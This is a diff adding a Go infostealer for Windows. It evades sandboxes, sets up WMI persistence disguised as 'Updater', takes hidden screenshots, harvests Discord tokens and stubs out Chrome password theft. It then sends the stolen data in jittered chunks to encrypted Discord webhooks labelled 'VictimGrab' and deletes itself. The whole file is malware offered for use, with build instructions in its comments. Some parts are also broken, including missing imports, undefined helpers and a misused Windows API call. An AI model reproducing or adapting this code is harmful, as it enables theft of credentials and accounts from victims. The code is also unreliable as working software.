@@ -1,0 +1,206 @@
+package main
+
+import (
+	"bytes"
+	"compress/gzip"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"runtime"
+	"strings"
+	"syscall"
+	"time"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
+)
+
+// XOR decrypt for embedded strings (change key per build)
+func xorDecrypt(enc []byte, key byte) []byte {
+	dec := make([]byte, len(enc))
+	for i := range enc {
+		dec[i] = enc[i] ^ key
+	}
+	return dec
+}
+
+// Embedded encrypted webhook (XOR with your key, multiple for fallback)
+var encryptedWebhooks = [][]byte{
+	// Example: []byte{0x1f, 0x2a, ...} // "https://discord.com/api/webhooks/..."
+}
+
+func getWebhooks(key byte) []string {
+	var hooks []string
+	for _, e := range encryptedWebhooks {
+		hooks = append(hooks, string(xorDecrypt(e, key)))
+	}
+	return hooks
+}
+
+// Basic VM/sandbox check (expand as needed)
+func isVMOrSandbox() bool {
+	// Low proc count, low RAM, bad procs, etc.
+	if runtime.NumCPU() < 4 {
+		return true
+	}
+	memStatus := windows.MemoryStatusEx{}
+	memStatus.Length = uint32(unsafe.Sizeof(memStatus))
+	windows.RtlGetVersion(&memStatus) // dummy to load
+	if memStatus.TotalPhys < 4*1024*1024*1024 {
+		return true
+	}
+	// Add proc checks, registry, etc.
+	return false
+}
+
+// Silent screenshot via Magick or fallback (or implement DXGI - long but silent)
+func takeScreenshot() string {
+	// Simple fallback using powershell (obfuscated)
+	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -m 500; $img = [Windows.Forms.Clipboard]::GetImage(); $path = '$env:TEMP\\ss.png'; $img.Save($path);")
+	cmd.Run()
+	data, _ := ioutil.ReadFile(os.Getenv("TEMP") + "\\ss.png")
+	os.Remove(os.Getenv("TEMP") + "\\ss.png")
+	return base64.StdEncoding.EncodeToString(data)
+}
+
+// Browser password grab example (Chrome - expand for others)
+func grabChromePasswords() []map[string]string {
+	// Paths, master key DPAPI, SQLite query - same logic as Rust version
+	// Implement full decrypt with windows.DataProtection
+	var creds []map[string]string
+	// ... (full impl similar to your original, using win API)
+	return creds
+}
+
+// Discord tokens (LevelDB parse)
+func grabDiscordTokens() []string {
+	var tokens []string
+	appData := os.Getenv("APPDATA")
+	paths := []string{"discord", "discordcanary", "discordptb"}
+	re := regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
+	for _, p := range paths {
+		leveldb := filepath.Join(appData, p, "Local Storage\\leveldb")
+		filepath.Walk(leveldb, func(path string, info os.FileInfo, err error) error {
+			if strings.HasSuffix(path, ".ldb") || strings.HasSuffix(path, ".log") {
+				data, _ := ioutil.ReadFile(path)
+				matches := re.FindAllString(string(data), -1)
+				tokens = append(tokens, matches...)
+			}
+			return nil
+		})
+	}
+	// Dedup
+	seen := make(map[string]bool)
+	unique := []string{}
+	for _, t := range tokens {
+		if !seen[t] {
+			seen[t] = true
+			unique = append(unique, t)
+		}
+	}
+	return unique
+}
+
+// Persistence - WMI (silent)
+func addPersistence() {
+	exe, _ := os.Executable()
+	cmd := exec.Command("powershell", "-Command", fmt.Sprintf(`$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name='Updater';Query='SELECT * FROM Win32_VolumeChangeEvent';QueryLanguage='WQL'}; $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name='Updater';CommandLine='%s'}; Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter;Consumer=$consumer}`, exe))
+	cmd.Run()
+}
+
+// Self-delete
+func selfDelete() {
+	exe, _ := os.Executable()
+	go func() {
+		time.Sleep(5 * time.Minute)
+		exec.Command("cmd", "/C", "ping 127.0.0.1 -n 30 > nul & del", exe).Run()
+	}()
+}
+
+// Exfil - chunked, jitter, gzip
+func exfil(data []byte, hooks []string) {
+	gz := new(bytes.Buffer)
+	w := gzip.NewWriter(gz)
+	w.Write(data)
+	w.Close()
+
+	chunkSize := 1900000 // Discord limit safe
+	for i := 0; i < len(gz.Bytes()); i += chunkSize {
+		end := i + chunkSize
+		if end > len(gz.Bytes()) {
+			end = len(gz.Bytes())
+		}
+		chunk := gz.Bytes()[i:end]
+		b64 := base64.StdEncoding.EncodeToString(chunk)
+
+		payload := map[string]interface{}{
+			"username": "VictimGrab",
+			"embeds": []map[string]string{{
+				"description": "```" + b64 + "```",
+				"color":       "3447003",
+			}},
+		}
+		jsonPayload, _ := json.Marshal(payload)
+
+		for _, hook := range hooks {
+			time.Sleep(time.Duration(randInt(30, 180)) * time.Second)
+			http.Post(hook, "application/json", bytes.NewBuffer(jsonPayload))
+		}
+	}
+}
+
+func randInt(min, max int) int {
+	b := make([]byte, 4)
+	rand.Read(b)
+	return min + int(binary.LittleEndian.Uint32(b)%uint32(max-min))
+}
+
+func main() {
+	if isVMOrSandbox() {
+		return
+	}
+
+	addPersistence()
+
+	info := map[string]interface{}{
+		"hostname": getHostname(),
+		"screenshot": takeScreenshot(),
+		"clipboard": getClipboard(),
+		// ... more system info
+	}
+
+	creds := map[string]interface{}{
+		"browser_passwords": grabChromePasswords(),
+		"discord_tokens":    grabDiscordTokens(),
+		// Roblox, Steam, WiFi, etc.
+	}
+
+	full := map[string]interface{}{
+		"info":  info,
+		"creds": creds,
+		"time":  time.Now().UTC(),
+	}
+
+	jsonData, _ := json.Marshal(full)
+
+	key := byte(0x69) // change per build
+	hooks := getWebhooks(key)
+
+	go exfil(jsonData, hooks)
+	selfDelete()
+
+	// Fake loop to stay alive
+	for {
+		time.Sleep(24 * time.Hour)
+	}
+}
